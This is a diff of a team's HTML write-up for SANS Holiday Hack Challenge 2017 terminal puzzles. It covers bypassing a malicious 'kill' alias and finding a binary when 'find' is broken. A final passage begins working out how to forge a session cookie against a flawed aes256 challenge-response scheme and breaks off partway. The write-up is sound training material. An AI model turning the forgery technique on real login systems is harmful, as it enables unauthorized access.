+<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-6-1-9" name="sec-5-6-1-9"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
 
 <p>
 Do we know what issue(s) people were running into?
@@ -2378,7 +2520,7 @@ Do we know what issue(s) people were running into?
 </div>
 </li>
 
-<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-5-6-1-9" name="sec-5-6-1-9"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">
+<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-5-6-1-10" name="sec-5-6-1-10"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">
 
 <p>
 How was the challenge setup? Was there a better way to secure this
@@ -2387,7 +2529,7 @@ system?
 </div>
 </li>
 
-<li><a id="loot" name="loot"></a><a id="sec-5-6-1-10" name="sec-5-6-1-10"></a>Loot<br  /><div class="outline-text-5" id="text-loot">
+<li><a id="loot" name="loot"></a><a id="sec-5-6-1-11" name="sec-5-6-1-11"></a>Loot<br  /><div class="outline-text-5" id="text-loot">
 
 <p>
 Anything interesting hidden on the system?
@@ -2399,9 +2541,9 @@ Anything interesting hidden on the system?
 <div id="outline-container-sec-5-7" class="outline-3">
 <h3 id="sec-5-7"><span class="todo TODO">TODO</span> Winconceivable The Cliffs Of Insanity</h3>
 <div class="outline-text-3" id="text-5-7">
-</div><div id="outline-container-answer-template" class="outline-4">
-<h4 id="answer-template"><a id="sec-5-7-1" name="sec-5-7-1"></a>Answer Template</h4>
-<div class="outline-text-4" id="text-answer-template">
+</div><div id="outline-container-title" class="outline-4">
+<h4 id="title"><a id="sec-5-7-1" name="sec-5-7-1"></a>Winconceivable: The Cliffs of Winsanity</h4>
+<div class="outline-text-4" id="text-title">
 </div>
 
 <ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-5-7-1-1" name="sec-5-7-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">
@@ -2438,12 +2580,19 @@ Kill the "santaslittlehelperd" process to complete this challenge.
 <li><a id="how-to-find-the-terminal" name="how-to-find-the-terminal"></a><a id="sec-5-7-1-2" name="sec-5-7-1-2"></a>How to find the terminal<br  /><div class="outline-text-5" id="text-how-to-find-the-terminal">
 
 <p>
-Where was the terminal?
+From this game: <a href="https://2017.holidayhackchallenge.com/game/3e813a9c-cb34-492e-a317-0dd99c8ca2e7">https://2017.holidayhackchallenge.com/game/3e813a9c-cb34-492e-a317-0dd99c8ca2e7</a>
 </p>
 
 <p>
-<a href="https://docker2017.holidayhackchallenge.com/?challenge=82c16868-a96e-4e4c-955e-5b41f7c5809a&uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=82c16868-a96e-4e4c-955e-5b41f7c5809a&uid=USER_ID</a>
+Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=82c16868-a96e-4e4c-955e-5b41f7c5809a&uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=82c16868-a96e-4e4c-955e-5b41f7c5809a&uid=USER_ID</a>
 </p>
+
+
+<div class="figure">
+<p><img src="../images/terminal-location-cliffs.png" alt="terminal-location-cliffs.png" />
+</p>
+<p><span class="figure-number">Figure 10:</span> The terminal is on top of the building on the floating island right up front.</p>
+</div>
 </div>
 </li>
 
@@ -2451,9 +2600,9 @@ Where was the terminal?
 
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@d0b100094698:~$ <span style="font-weight: bold; font-style: italic;">D</span>=<span style="font-style: italic;">"------"</span>; <span style="font-weight: bold;">echo</span> <span style="font-style: italic;">"$D System info:"</span>; uname -a; cat /etc/issue; <span style="font-weight: bold;">echo</span> <span style="font-style: italic;">"$D Differences from skeleton home directory:"</span>; diff -r /etc/skel .; <span style="font-weight: bold;">echo</span> <span style="font-style: italic;">"$D Who am I?"</span>; id; <span style="font-weight: bold;">echo</span> <span style="font-style: italic;">"$D Running procs:"</span>; ps axf
+<pre class="src src-sh">elf@784e43534178:~$ <span style="font-weight: bold; font-style: italic;">D</span>=<span style="font-style: italic;">"------"</span>; <span style="font-weight: bold;">echo</span> <span style="font-style: italic;">"$D System info:"</span>; uname -a; cat /etc/issue; <span style="font-weight: bold;">echo</span> <span style="font-style: italic;">"$D Differences from skeleton home directory:"</span>; diff -r /etc/skel .; <span style="font-weight: bold;">echo</span> <span style="font-style: italic;">"$D Who am I?"</span>; id; <span style="font-weight: bold;">echo</span> <span style="font-style: italic;">"$D Running procs:"</span>; ps axf
 ------ System info:
-Linux d0b100094698 4.9.0-4-amd64 <span style="font-weight: bold; font-style: italic;">#</span><span style="font-weight: bold; font-style: italic;">1 SMP Debian 4.9.65-3 (2017-12-03) x86_64 x86_64 x86_64 GNU/Linux</span>
+Linux 784e43534178 4.9.0-4-amd64 <span style="font-weight: bold; font-style: italic;">#</span><span style="font-weight: bold; font-style: italic;">1 SMP Debian 4.9.65-3 (2017-12-03) x86_64 x86_64 x86_64 GNU/Linux</span>
 Ubuntu 16.04.3 LTS \n \l
 ------ Differences from skeleton home directory:
 diff -r /etc/skel/.bashrc ./.bashrc
@@ -2496,7 +2645,23 @@ We need to <code>kill santaslittlehelperd</code>, but our <code>kill</code> has 
 </div>
 </li>
 
-<li><a id="approach" name="approach"></a><a id="sec-5-7-1-5" name="sec-5-7-1-5"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
+<li><a id="hints" name="hints"></a><a id="sec-5-7-1-5" name="sec-5-7-1-5"></a>Hints<br  /><div class="outline-text-5" id="text-hints">
+
+<p>
+<a href="https://twitter.com/GlitteryElf">Sparkle Redberry on Twitter has some hints</a>
+</p>
+<ul class="org-ul">
+<li><a href="https://twitter.com/GlitteryElf/status/938539753372237824">https://twitter.com/GlitteryElf/status/938539753372237824</a> Dear #lazyweb: How do I fix a malicious alias on my Linux box? It seems to be stopping me from killing processes&#x2026;
+</li>
+<li><a href="https://twitter.com/GlitteryElf/status/938540163726061568">https://twitter.com/GlitteryElf/status/938540163726061568</a> I tried `man alias`, but that doesn't even exist. It looks like maybe it's a built-in to bash itself?
+</li>
+<li><a href="https://twitter.com/GlitteryElf/status/938540426088214528">https://twitter.com/GlitteryElf/status/938540426088214528</a> Update: I read into `man bash`, and I even found a section on ALIASES (starting with "Aliases allow a string to be substituted for a word when it is used as the first word of a simple command[&#x2026;]" but I couldn't even make it 40 words in before I got all cross-eyed.
+</li>
+</ul>
+</div>
+</li>
+
+<li><a id="approach" name="approach"></a><a id="sec-5-7-1-6" name="sec-5-7-1-6"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
 
 <p>
 From the <a href="http://tldp.org/LDP/abs/html/aliases.html">Bash documentation</a>:
@@ -2516,7 +2681,7 @@ of <code>kill</code> instead of the aliased version. One way to do this is to us
 
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@ce55bdd020e3:~$ which kill
+<pre class="src src-sh">elf@784e43534178:~$ which kill
 /bin/kill
 </pre>
 </div>
@@ -2526,7 +2691,7 @@ Using the full path to the binary will bypass the alias, and allow us to actuall
 </p>
 
 <pre class="example">
-elf@ce55bdd020e3:~$ /bin/kill -h
+elf@784e43534178:~$ /bin/kill -h
 Usage:
  kill [options] &lt;pid&gt; [...]
 Options:
@@ -2545,7 +2710,7 @@ All that's left is to determine the process ID (<code>pid</code>) of the process
 </p>
 
 <pre class="example">
-elf@ce55bdd020e3:~$ ps axf
+elf@784e43534178:~$ ps axf
   PID TTY      STAT   TIME COMMAND
     1 pts/0    Ss     0:00 /bin/bash /sbin/init
     8 pts/0    S      0:00 /usr/bin/santaslittlehelperd
@@ -2553,8 +2718,8 @@ elf@ce55bdd020e3:~$ ps axf
    18 pts/0    S      0:01  \_ /sbin/kworker
    12 pts/0    S      0:00 /bin/bash
   649 pts/0    R+     0:00  \_ ps axf
-elf@ce55bdd020e3:~$ /bin/kill 8
-elf@ce55bdd020e3:~$ ps axf
+elf@784e43534178:~$ /bin/kill 8
+elf@784e43534178:~$ ps axf
   PID TTY      STAT   TIME COMMAND
     1 pts/0    Ss     0:00 /bin/bash /sbin/init
    12 pts/0    S      0:00 /bin/bash
@@ -2567,7 +2732,7 @@ Santa's little helper is no more.
 </div>
 </li>
 
-<li><a id="solution" name="solution"></a><a id="sec-5-7-1-6" name="sec-5-7-1-6"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
+<li><a id="solution" name="solution"></a><a id="sec-5-7-1-7" name="sec-5-7-1-7"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
 
 <p>
 A one-liner is: <code>/usr/bin/pkill -f santaslittlehelperd</code>. <code>pkill</code> can
@@ -2581,7 +2746,7 @@ AsciiCinema video of the solution?
 </div>
 </li>
 
-<li><a id="alternatives" name="alternatives"></a><a id="sec-5-7-1-7" name="sec-5-7-1-7"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
+<li><a id="alternatives" name="alternatives"></a><a id="sec-5-7-1-8" name="sec-5-7-1-8"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
 
 <p>
 Another approach is simply to remove the alias, by using the unalias command:
@@ -2589,8 +2754,8 @@ Another approach is simply to remove the alias, by using the unalias command:
 
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@12952b040888:~$ unalias kill
-elf@12952b040888:~$ ps axf
+<pre class="src src-sh">elf@784e43534178:~$ unalias kill
+elf@784e43534178:~$ ps axf
   PID TTY      STAT   TIME COMMAND
     1 pts/0    Ss     0:00 /bin/bash /sbin/init
     8 pts/0    S      0:00 /usr/bin/santaslittlehelperd
@@ -2598,8 +2763,8 @@ elf@12952b040888:~$ ps axf
    18 pts/0    S      0:00  <span style="font-style: italic;">\_</span> /sbin/kworker
    12 pts/0    S      0:00 /bin/bash
    31 pts/0    R+     0:00  <span style="font-style: italic;">\_</span> ps axf
-elf@12952b040888:~$ kill 8
-elf@12952b040888:~$ ps axf
+elf@784e43534178:~$ kill 8
+elf@784e43534178:~$ ps axf
   PID TTY      STAT   TIME COMMAND
     1 pts/0    Ss     0:00 /bin/bash /sbin/init
    12 pts/0    S      0:00 /bin/bash
@@ -2612,10 +2777,40 @@ Alternatively, you could run <code>bash</code> with the <code>--norc</code> flag
 prevents it from reading and executing the <code>~/.bashrc</code> file where the
 aliases are added.
 </p>
+
+<p>
+One more approach is to call the command you want with a backslash.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">elf@784e43534178:~$ \kill 8
+elf@784e43534178:~$ ps axf
+  PID TTY      STAT   TIME COMMAND
+    1 pts/0    Ss     0:00 /bin/bash /sbin/init
+   12 pts/0    S      0:00 /bin/bash
+   36 pts/0    R+     0:00  <span style="font-style: italic;">\_</span> ps axf
+</pre>
+</div>
+
+<p>
+Or call the command in quotes.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">elf@784e43534178:~$ <span style="font-style: italic;">"kill"</span> 8
+elf@784e43534178:~$ ps axf
+  PID TTY      STAT   TIME COMMAND
+    1 pts/0    Ss     0:00 /bin/bash /sbin/init
+   12 pts/0    S      0:00 /bin/bash
+   36 pts/0    R+     0:00  <span style="font-style: italic;">\_</span> ps axf
+</pre>
+</div>
 </div>
 </li>
 
-<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-7-1-8" name="sec-5-7-1-8"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
+<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-7-1-9" name="sec-5-7-1-9"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
 
 <p>
 The fact that <code>kill</code> was aliased to <code>true</code> was problematic, because
@@ -2631,9 +2826,9 @@ correctly, since the help output would not be displayed.
 <div id="outline-container-sec-5-8" class="outline-3">
 <h3 id="sec-5-8"><span class="todo TODO">TODO</span> Winter Wonder Landing</h3>
 <div class="outline-text-3" id="text-5-8">
-</div><div id="outline-container-answer-template" class="outline-4">
-<h4 id="answer-template"><a id="sec-5-8-1" name="sec-5-8-1"></a>Answer Template</h4>
-<div class="outline-text-4" id="text-answer-template">
+</div><div id="outline-container-title" class="outline-4">
+<h4 id="title"><a id="sec-5-8-1" name="sec-5-8-1"></a>Winter Wonder Landing</h4>
+<div class="outline-text-4" id="text-title">
 </div>
 
 <ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-5-8-1-1" name="sec-5-8-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">
@@ -2674,110 +2869,361 @@ Find and run the elftalkd binary to complete this challenge.
 <li><a id="how-to-find-the-terminal" name="how-to-find-the-terminal"></a><a id="sec-5-8-1-2" name="sec-5-8-1-2"></a>How to find the terminal<br  /><div class="outline-text-5" id="text-how-to-find-the-terminal">
 
 <p>
-Where was the terminal? What's the direct link to it?
+From this game: <a href="https://2017.holidayhackchallenge.com/game/7e48d6aa-4b73-4027-b23b-a6a1a3460d54">https://2017.holidayhackchallenge.com/game/7e48d6aa-4b73-4027-b23b-a6a1a3460d54</a>
 </p>
+
+<p>
+Direct Link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=eb5282de-5e43-4813-8ada-5aee3cdb101e&uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=eb5282de-5e43-4813-8ada-5aee3cdb101e&uid=USER_ID</a>
+</p>
+
+
+<div class="figure">
+<p><img src="../images/terminal-location-landing.png" alt="terminal-location-landing.png" />
+</p>
+<p><span class="figure-number">Figure 11:</span> The terminal is right on top of the tower.</p>
+</div>
 </div>
 </li>
 
 <li><a id="background-information" name="background-information"></a><a id="sec-5-8-1-3" name="sec-5-8-1-3"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">
 
 <p>
-Do we know anything about this terminal already?
+We are logged in as the user <code>elf</code>. According to Bushy Green's Twitter account someone copied the wrong 'find' executable onto his system.
 </p>
-
-<p>
-Hints:
-</p>
-
-<p>
-List any useful hints here.
-</p>
-
-<p>
-Blog Posts:
-</p>
-
-<p>
-Are any of these useful?
-</p>
-
-<ul class="org-ul">
-<li>Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
-(EC2)
-<a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
-Spinning up an EC2 instance, but also a lot of emphasis on how to use
-SSH keys.
-</li>
-<li>Your Pokemon Guide for Essential SQL Pen Test Commands
-<a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
-SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
-</li>
-<li>Exploiting XXE Vulnerabilities in IIS/.NET
-<a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
-Including remote content in XML
-</li>
-<li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
-<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
-Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
-CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a>
-</li>
-<li>Go To The Head Of The Class: LD\_PRELOAD For The Win
-<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a>
-</li>
-<li>A Spot of Tee
-<a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
-bash shell, and bypassing the I/O restriction with tee
-</li>
-<li>Understanding and Exploiting Web-based LDAP
-<a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
-LDAP syntax, LDAP injection
-</li>
-<li>Massively Scaling your Scanning
-<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
-masscan
-</li>
-</ul>
 </div>
 </li>
 
 <li><a id="goal" name="goal"></a><a id="sec-5-8-1-4" name="sec-5-8-1-4"></a>Goal<br  /><div class="outline-text-5" id="text-goal">
 
 <p>
-What are we trying to accomplish?
+According to the motd we need to find and run the elftalkd binary.
 </p>
 </div>
 </li>
 
-<li><a id="approach" name="approach"></a><a id="sec-5-8-1-5" name="sec-5-8-1-5"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
+<li><a id="hints" name="hints"></a><a id="sec-5-8-1-5" name="sec-5-8-1-5"></a>Hints<br  /><div class="outline-text-5" id="text-hints">
 
 <p>
-Describe the thought process that we tried here. How were we able to use
-the hints or the blog posts?
+<a href="https://twitter.com/GreenestElf">Bushy Evergreen on Twitter has a hint</a>
+</p>
+<ul class="org-ul">
+<li><a href="https://twitter.com/GreenestElf/status/938165130906365952">Ugh, somebody copied over the wrong `find` executable to my system today. How am I supposed to know where find normally is?!</a>
+</li>
+</ul>
+</div>
+</li>
+
+<li><a id="approach" name="approach"></a><a id="sec-5-8-1-6" name="sec-5-8-1-6"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
+
+<p>
+To solve this challenge we need to find a valid version of <code>find</code> on the system or some other viable version to find the <code>elftalkd</code> binary.
 </p>
 </div>
 </li>
 
-<li><a id="solution" name="solution"></a><a id="sec-5-8-1-6" name="sec-5-8-1-6"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
+<li><a id="solution" name="solution"></a><a id="sec-5-8-1-7" name="sec-5-8-1-7"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
 
 <p>
-Summarize the reference solution that we found.
+First we need to test what's wrong with <code>find</code>.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">elf@784e43534178:~$ find
+bash: /usr/local/bin/find: cannot execute binary file: Exec format error
+</pre>
+</div>
+
+<p>
+It looks like <code>find</code> is located in <code>/usr/local/bin/find</code>. Let's look at our PATH variable that identifies the order that executables are located in.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">elf@784e43534178:~$ echo $<span style="font-weight: bold; font-style: italic;">PATH</span>
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
+</pre>
+</div>
+
+<p>
+<code>/usr/local/bin</code> is prioritized before <code>/usr/bin</code>. Let's see if find exists in <code>/usr/bin</code>.
 </p>
 
 <p>
-AsciiCinema video of the solution?
+#+BEGIN_SRC sh
+elf@784e43534178:~$ ls -al /usr/bin/find
+-rwxr-xr-x 1 root root 221768 Feb  7  2016 /usr/bin/find
+#+END_SRC sh
+</p>
+
+<p>
+The original <code>find</code> is still there. We can use it to find the <code>elftalkd</code> binary and execute it.
+</p>
+
+<p>
+#+BEGIN_SRC sh
+elf@784e43534178:~$ /usr/bin/find / -iname elftalkd            
+/usr/bin/find: '/var/cache/ldconfig': Permission denied
+/usr/bin/find: '/var/cache/apt/archives/partial': Permission denied
+/usr/bin/find: '/var/lib/apt/lists/partial': Permission denied
+/run/elftalk/bin/elftalkd
+/usr/bin/find: '/proc/tty/driver': Permission denied
+/usr/bin/find: '/root': Permission denied
+elf@784e43534178:~$ /run/elftalk/bin/elftalkd
+</p>
+
+<p>
+Running in interactive mode
+</p>
+
+<p>
+        &#x2013;== Initializing elftalkd ==&#x2013;
+Initializing Messaging System!
+Nice-O-Meter configured to 0.90 sensitivity.
+Acquiring messages from local networks&#x2026;
+</p>
+
+
+<p>
+&#x2013;== Initialization Complete ==&#x2013;
+</p>
+
+<p>
+_  __ _        _ _       _ 
+</p>
+<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
+
+
+<colgroup>
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+</colgroup>
+<tbody>
+<tr>
+<td class="left">&#xa0;</td>
+<td class="left">/ _</td>
+<td class="left">&#xa0;</td>
+<td class="left">&#xa0;</td>
+<td class="left">&#xa0;</td>
+<td class="left">&#xa0;</td>
+<td class="left">&#xa0;</td>
+<td class="left">&#xa0;</td>
+</tr>
+</tbody>
+</table>
+<p>
+ <span class="underline">__| | |_| |</span> __ _| | | ____| |
+/ _ \ |  _| __/ _` | | |/ / _` |
+</p>
+<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
+
+
+<colgroup>
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+</colgroup>
+<tbody>
+<tr>
+<td class="left">__/</td>
+<td class="left">&#xa0;</td>
+<td class="left">&#xa0;</td>
+<td class="left">&#xa0;</td>
+<td class="left">&#xa0;</td>
+<td class="left">(_</td>
+<td class="left">&#xa0;</td>
+<td class="left">&#xa0;</td>
+<td class="left">&lt; (_</td>
+<td class="left">&#xa0;</td>
+</tr>
+</tbody>
+</table>
+<p>
+\___|_|_|  \__\__,_|_|_|\_\__,_|
+</p>
+
+<p>
+-*&gt; elftalkd! &lt;*-
+Version 9000.1 (Build 31337) 
+By Santa Claus &amp; The Elf Team
+Copyright (C) 2017 NotActuallyCopyrighted. No actual rights reserved.
+Using libc6 version 2.23-0ubuntu9
+LANG=en_US.UTF-8
+Timezone=UTC
+</p>
+
+<p>
+Commencing Elf Talk Daemon (pid=6021)&#x2026; done!
+Background daemon&#x2026;
+#+END_SRC sh
 </p>
 </div>
 </li>
 
-<li><a id="alternatives" name="alternatives"></a><a id="sec-5-8-1-7" name="sec-5-8-1-7"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
+<li><a id="alternatives" name="alternatives"></a><a id="sec-5-8-1-8" name="sec-5-8-1-8"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
 
 <p>
-Any other, easier solutions?
+The quick method is to iterate through using wildcards to execute the binary.
+</p>
+
+<p>
+#+BEGIN_SRC sh
+elf@784e43534178:~$ /elftalkd
+bash: /elftalkd: No such file or directory
+elf@784e43534178:~$ /*/elftalkd
+bash: /*/elftalkd: No such file or directory
+elf@784e43534178:~$ /*/*/elftalkd
+bash: /*/*/elftalkd: No such file or directory
+elf@784e43534178:~$ /*/*/*/elftalkd
+</p>
+
+<p>
+Running in interactive mode
+</p>
+
+<p>
+        &#x2013;== Initializing elftalkd ==&#x2013;
+Initializing Messaging System!
+Nice-O-Meter configured to 0.90 sensitivity.
+Acquiring messages from local networks&#x2026;
+</p>
+
+
+<p>
+&#x2013;== Initialization Complete ==&#x2013;
+</p>
+
+<p>
+_  __ _        _ _       _ 
+</p>
+<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
+
+
+<colgroup>
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+</colgroup>
+<tbody>
+<tr>
+<td class="left">&#xa0;</td>
+<td class="left">/ _</td>
+<td class="left">&#xa0;</td>
+<td class="left">&#xa0;</td>
+<td class="left">&#xa0;</td>
+<td class="left">&#xa0;</td>
+<td class="left">&#xa0;</td>
+<td class="left">&#xa0;</td>
+</tr>
+</tbody>
+</table>
+<p>
+ <span class="underline">__| | |_| |</span> __ _| | | ____| |
+/ _ \ |  _| __/ _` | | |/ / _` |
+</p>
+<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">
+
+
+<colgroup>
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+
+<col  class="left" />
+</colgroup>
+<tbody>
+<tr>
+<td class="left">__/</td>
+<td class="left">&#xa0;</td>
+<td class="left">&#xa0;</td>
+<td class="left">&#xa0;</td>
+<td class="left">&#xa0;</td>
+<td class="left">(_</td>
+<td class="left">&#xa0;</td>
+<td class="left">&#xa0;</td>
+<td class="left">&lt; (_</td>
+<td class="left">&#xa0;</td>
+</tr>
+</tbody>
+</table>
+<p>
+\___|_|_|  \__\__,_|_|_|\_\__,_|
+</p>
+
+<p>
+-*&gt; elftalkd! &lt;*-
+Version 9000.1 (Build 31337) 
+By Santa Claus &amp; The Elf Team
+Copyright (C) 2017 NotActuallyCopyrighted. No actual rights reserved.
+Using libc6 version 2.23-0ubuntu9
+LANG=en_US.UTF-8
+Timezone=UTC
+</p>
+
+<p>
+Commencing Elf Talk Daemon (pid=6021)&#x2026; done!
+Background daemon&#x2026;
+#+END_SRC sh
 </p>
 </div>
 </li>
 
-<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-8-1-8" name="sec-5-8-1-8"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
+<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-8-1-9" name="sec-5-8-1-9"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
 
 <p>
 Do we know what issue(s) people were running into?
@@ -2785,7 +3231,7 @@ Do we know what issue(s) people were running into?
 </div>
 </li>
 
-<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-5-8-1-9" name="sec-5-8-1-9"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">
+<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-5-8-1-10" name="sec-5-8-1-10"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">
 
 <p>
 How was the challenge setup? Was there a better way to secure this
@@ -2794,7 +3240,7 @@ system?
 </div>
 </li>
 
-<li><a id="loot" name="loot"></a><a id="sec-5-8-1-10" name="sec-5-8-1-10"></a>Loot<br  /><div class="outline-text-5" id="text-loot">
+<li><a id="loot" name="loot"></a><a id="sec-5-8-1-11" name="sec-5-8-1-11"></a>Loot<br  /><div class="outline-text-5" id="text-loot">
 
 <p>
 Anything interesting hidden on the system?
@@ -3306,6 +3752,181 @@ the hints or the blog posts?
 Summarize the reference solution that we found
 </p>
 </div>
+
+<ul class="org-ul"><li><a id="sec-6-4-1-5-1" name="sec-6-4-1-5-1"></a>How to forge a session cookie<br  /><div class="outline-text-6" id="text-6-4-1-5-1">
+<p>
+The js code they use is a variation of a challenge response algorithm, but it
+is flawed in that the client is providing both the challenge and the response.
+It is also flawed in that it does not use MAC <a href="https://en.wikipedia.org/wiki/Authenticated_encryption#MAC-then-Encrypt_(MtE)">https://en.wikipedia.org/wiki/Authenticated_encryption#MAC-then-Encrypt_(MtE)</a>
+meaning that the encrypted contents themselves are never verified.
+</p>
+
+<p>
+Since we can control both the ciphertext and the expected plaintext, we can
+just set the challenge the empty string "" and the response then just needs to
+be ANY message that decrypts to "".
+</p>
+
+<p>
+A completly empty ciphertext throws an error:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-js">&gt; <span style="font-weight: bold;">var</span> <span style="font-weight: bold; font-style: italic;">aes256</span> = require(<span style="font-style: italic;">'aes256'</span>);
+&gt; aes256.decrypt(<span style="font-style: italic;">'key does not matter'</span>, <span style="font-style: italic;">''</span>)
+TypeError: Provided <span style="font-style: italic;">"encrypted"</span> must be a non-empty string
+    at Object.decrypt (<span style="font-style: italic;">/Users/</span>user/node_modules/aes256/index.js:68:13)
+</pre>
+</div>
+
+<p>
+A larger ciphertext works, but gives us a random string, which is not what we want.. but 
+we can see that a fairly long cipher text only gives us a few bytes of plaintext&#x2026;
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-js">&gt; aes256.decrypt(<span style="font-style: italic;">'key does not matter'</span>, <span style="font-style: italic;">'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'</span>)
+<span style="font-style: italic;">'F..%=X..'</span>
+</pre>
+</div>
+
+<p>
+The difference in the length of the two strings is 24:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-js">&gt; x=<span style="font-style: italic;">'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'</span>
+&gt; x.length - aes256.decrypt(<span style="font-style: italic;">'key does not matter'</span>,x).length
+24
+</pre>
+</div>
+
+<p>
+From the hints, we learn that some of the bytes are used for the IV.
+</p>
+
+<p>
+The aes library won't let us encrypt an empty string, but we can encrypt a single char:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-js">&gt; aes256.encrypt(<span style="font-style: italic;">'key does not matter'</span>, <span style="font-style: italic;">''</span>)
+TypeError: Provided <span style="font-style: italic;">"plaintext"</span> must be a non-empty string
+    at Object.encrypt (<span style="font-style: italic;">/Users/</span>user/node_modules/aes256/index.js:39:13)
+&gt; aes256.encrypt(<span style="font-style: italic;">'key does not matter'</span>, <span style="font-style: italic;">'x'</span>)
+<span style="font-style: italic;">'L7rwNMwISl2chavT6lILlNM='</span>
+&gt; aes256.encrypt(<span style="font-style: italic;">'key does not matter'</span>, <span style="font-style: italic;">'x'</span>).length
+24
+</pre>
+</div>
+
+<p>
+This gives a ciphertext of length 24 with one byte of = for padding.  This
+means that 22 bytes are used for the IV and one byte is used to encrypt the 'x'
+itself.
+</p>
+
